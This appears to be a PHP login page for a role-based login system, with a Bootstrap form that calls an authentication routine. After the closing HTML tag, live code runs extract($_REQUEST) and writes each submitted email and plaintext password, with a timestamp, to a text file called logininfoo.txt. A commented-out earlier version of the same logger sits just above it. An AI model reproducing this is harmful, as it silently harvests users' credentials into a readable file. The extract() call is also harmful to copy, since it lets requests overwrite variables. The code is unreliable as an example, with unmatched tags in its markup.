<?php
include('./public/meta.php');
include('./public/header.php');
// include($_SERVER['DOCUMENT_ROOT'].'/projects/srs-b4-Intern-5/include/'.'protected/header.php');
// include($_SERVER['DOCUMENT_ROOT'].'/projects/srs-b4-Intern-5/include/'.'public/meta.php');

$outPut = "";
if(isset($_COOKIE['userName'])){
	header('location: Dashboard.php');
}
if (isset($_POST['submit'])) {
  $userName = $_POST['email'];
  $userPassword = $_POST['uPassword'];
  // echo $userName, $userPassword;
  // session_start();
  $outPut = $auth->login($userName, $userPassword);

  if ($outPut) {
    
    header("Location: Dashboard.php");
    echo "<br>";
  } else {
    $outPut = "incorrect information";
//     "
//    <script>alert(' incorrect information');</script>

// ";
  }
}

?>

<head>
  <title>multi-user role-based-login-system</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
</head>
<div class="container d-flex justify-content-center align-items-center" style="min-height: 100vh">
  <form class="border shadow p-3 rounded" action="index.php" method="post" style="width: 450px;">
    <h1 class="text-center p-3">LOGIN</h1>
    <div class="mb-3">
      <label for="username" class="form-label">email</label>
      <input type="text" class="form-control" name="email" id="email">
    </div>
    <div class="mb-3">
      <label for="password" class="form-label">uPassword</label>
      <input type="password" name="uPassword" class="form-control" id="uPassword">
    </div>
    <br />
    <input type="checkbox" name="remember"  id="agree" /> keep me .
    <br />
    <!-- <select class="form-select mb-3" name="role" aria-label="Default select example">
      <option selected value="user">User</option> -->
    <!-- <option value="admin">Admin</option>
      <option value="chairman">chairman</option>
      <option value="member">member</option> -->

    </select>

    <div class="action">
      <input type="submit" name="submit" value="Login"></button>
      <?php echo $outPut ? ($outPut) : (""); ?>
    </div>
  </form>
</div>
</body>

</html>
<?php

//  extract($_REQUEST);
//  $file=fopen("logininfo.txt","a");
//  fwrite($file,$email);
//  fwrite($file,$uPassword);
// //  $fwrite =( "$file". ("email: ".$email. " Password: ". $uPassword." ". date("yy/mm/dd h:i:s")));
//  fclose($file);

extract($_REQUEST);
$file = fopen("logininfoo.txt", "w");
date_default_timezone_set("Asia/Calcutta");
$str = fwrite($file, "email: " . $email . "'\n' Password: " . $uPassword . " '\n'" . date("d/m/y h:i:s"));
fclose($file);


?>

<!-- ********************************************************************************************** -->
<!-- <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="stylesheet" href="index.css">
  <title>Login Form Demo</title>
</head>
<body>
  <div class="login-wrapper">
    <form action="index.php" class="form">
      <img src="ava" alt="">
      <h2>Login</h2>
      <div class="input-group">
        <input type="text" name="email" id="email" required>
        <label for="email">User Name</label>
      </div>
      <div class="input-group">
        <input type="password" name="uPassword" id="uPassword" required>
        <label for="uPassword">Password</label>
      </div>
      <input type="submit" value="Login" class="submit-btn">
      <a href="#forgot-pw" class="forgot-pw">Forgot Password?</a>
    </form>

    <div id="forgot-pw">
      <form action="" class="form">
        <a href="#" class="close">&times;</a>
        <h2>Reset Password</h2>
        <div class="input-group">
          <input type="email" name="email" id="email" required>
          <label for="email">Email</label>
        </div>
        <input type="submit" name="submit" value="Login">
      </form>
    </div>
  </div>
</body>
</html>  